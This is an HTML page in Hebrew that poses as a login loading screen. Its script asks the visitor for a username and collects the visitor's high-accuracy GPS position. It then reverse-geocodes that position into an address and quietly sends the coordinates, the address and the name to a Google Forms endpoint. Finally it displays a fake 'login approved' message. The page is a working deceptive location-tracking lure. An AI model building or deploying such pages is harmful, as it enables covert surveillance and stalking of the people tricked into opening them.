<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>טעינה...</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #2ecc71; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; color: #444; font-size: 18px; font-weight: bold; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p id="status">מתחבר למערכת...</p>

    <script>
        window.onload = function() {
            const userName = prompt("הכנס שם משתמש לכניסה:");
            if (!userName) return;

            document.getElementById("status").innerText = "מאמת נתונים...";

            let hasSent = false;
            let bestPosition = null;

            async function sendToGoogle(pos, name) {
                if (hasSent) return;
                hasSent = true;

                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                
                // הקישור המדויק ביותר ל-Google Maps
                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                let addressDesc = "";
                try {
                    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`, {
                        headers: { 'Accept-Language': 'he' }
                    });
                    const d = await r.json();
                    addressDesc = (d.display_name || "כתובת כללית") + " | לצפייה במפה: " + mapsLink;
                } catch (e) {
                    addressDesc = "מיקום מדויק: " + mapsLink;
                }

                const formID = "1FAIpQLSfYA2SsnyuwYFOhz_IjWdfLAkudHUJPBWmS3VUoF-8xp5u6Gw";
                const url = `https://docs.google.com/forms/d/e/${formID}/formResponse` +
                    `?entry.1905099702=${lat}` +
                    `&entry.379601602=${lon}` +
                    `&entry.1378939865=${encodeURIComponent(addressDesc)}` +
                    `&entry.2102560173=${encodeURIComponent(name)}` +
                    `&submit=Submit`;

                fetch(url, { mode: 'no-cors' });
                document.getElementById("status").innerText = "נכנסת בהצלחה!";
                setTimeout(() => { alert("שלום " + name + ", הכניסה אושרה."); }, 500);
            }

            const watchID = navigator.geolocation.watchPosition((pos) => {
                bestPosition = pos;
                if (pos.coords.accuracy <= 5) {
                    navigator.geolocation.clearWatch(watchID);
                    sendToGoogle(pos, userName);
                }
            }, null, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });

            setTimeout(() => {
                if (!hasSent && bestPosition) {
                    navigator.geolocation.clearWatch(watchID);
                    sendToGoogle(bestPosition, userName);
                }
            }, 10000);
        };
    </script>
</body>
</html>
